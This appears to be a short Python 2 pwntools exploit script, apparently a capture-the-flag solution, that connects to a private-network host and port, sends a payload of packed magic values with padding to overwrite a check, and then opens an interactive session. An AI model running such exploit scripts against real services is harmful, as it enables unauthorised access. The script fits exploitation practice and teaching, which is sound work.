#!/usr/bin/env python2
from pwn import *


host , port = '172.16.115.109' , 10102
#host , port = '192.168.78.251' , 4000
y = remote( host , port )

sleep(1)
p = p32(0xfaceb00c)
p += 'a' * 4
p += p32(0xdeadbeef)
y.send(p)

y.interactive()